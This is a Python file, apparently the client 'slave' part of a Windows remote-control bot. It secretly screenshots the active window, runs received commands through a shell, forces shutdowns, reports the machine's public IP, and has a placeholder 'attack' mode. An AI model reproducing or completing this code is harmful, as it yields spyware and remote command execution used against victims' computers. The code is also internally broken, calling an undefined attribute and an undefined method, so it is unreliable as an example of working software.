import json
import os,requests,threading,subprocess
import sys,cv2
from PIL import Image
import numpy as np
import win32gui, win32ui, win32con, win32api
from json import *
def window_capture(filename):
    hwnd = 0 # 窗口的编号，0号表示当前活跃窗口
    # 根据窗口句柄获取窗口的设备上下文DC（Divice Context）
    hwndDC = win32gui.GetWindowDC(hwnd)
    # 根据窗口的DC获取mfcDC
    mfcDC = win32ui.CreateDCFromHandle(hwndDC)
    # mfcDC创建可兼容的DC
    saveDC = mfcDC.CreateCompatibleDC()
    # 创建bigmap准备保存图片
    saveBitMap = win32ui.CreateBitmap()
    # 获取监控器信息
    MoniterDev = win32api.EnumDisplayMonitors(None, None)
    w = MoniterDev[0][2][2]
    h = MoniterDev[0][2][3]
    # print w,h　　　#图片大小
    # 为bitmap开辟空间
    saveBitMap.CreateCompatibleBitmap(mfcDC, w, h)
    # 高度saveDC，将截图保存到saveBitmap中
    saveDC.SelectObject(saveBitMap)
    # 截取从左上角（0，0）长宽为（w，h）的图片
    saveDC.BitBlt((0, 0), (w, h), mfcDC, (0, 0), win32con.SRCCOPY)
    img=(np.fromstring(saveBitMap.GetBitmapBits(True),dtype='uint8'))

    img=img.reshape(h,w,4)
    w=640
    h=480
    im = Image.fromarray(img)
    im = im.resize((w, h))
    im=im.convert("L")
    im=im.tobytes()
    # print((im))
    # print(ret[-2:])
    #长宽
    return im
# window_capture(123)
# 如何规范命令
# 1.mode设置模式  cmd:0（默认）
class SlaveExecutor(object):
    def __init__(self,Command=None,Mode=0):
        # self.commands=[Command]
        # self.command=Command[0]
        self.Mode=Mode

    def run(self):

        #1模式设置
        # if self.command[0].isdigit():
        #     self.Mode=int(self.command[0])
        #     self.command=self.command[1:]
        Modes_Funcs={
            1:lambda:self.cmd_mode(),
            2:lambda:self.attack_mode(),
            3:lambda:self.listen_mode(),
        }
        if self.Mode in Modes_Funcs.keys():
            func=Modes_Funcs[self.Mode]
            return func()
        return None,None

    def common_cmd(self,cmd):
        flag=None
        #模式后cmd前缀
        ret=self.parser_cmd(cmd)
        funcs={
            # 匿名函数
            "stn":lambda:self.shutdown(),
            "addr":lambda:self.get_address(),
            "exit":lambda:sys.exit(),
        }
        if ret in funcs.keys():
            func=funcs[ret]
            flag,ret=func()
        return flag,ret

    def cmd_mode(self):
        try:
            flag,ret=self.common_cmd(self.command[:])
            if ret==self.command:
                subprocess.call(self.command,shell=True)
            else:
                return flag,ret

        except:
            pass
        return None,None
    def attack_mode(self):
        try:
            pass
        except:
            pass
    def listen_mode(self):
        try:
            ret = window_capture("ss")
            return "image",ret
        except:
            return None

    def get_address(self):
        return "addre",requests.get("http://ip.42.pl/raw").text

    def shutdown(self):
        subprocess.Popen("shutdown -s -t 1")



    def parser_cmd(self,cmd):
        if cmd.startswith("cmd:") or cmd.startswith("cmd："):
            cmd=cmd[4:]
            self._os_cmd(cmd)
        return cmd
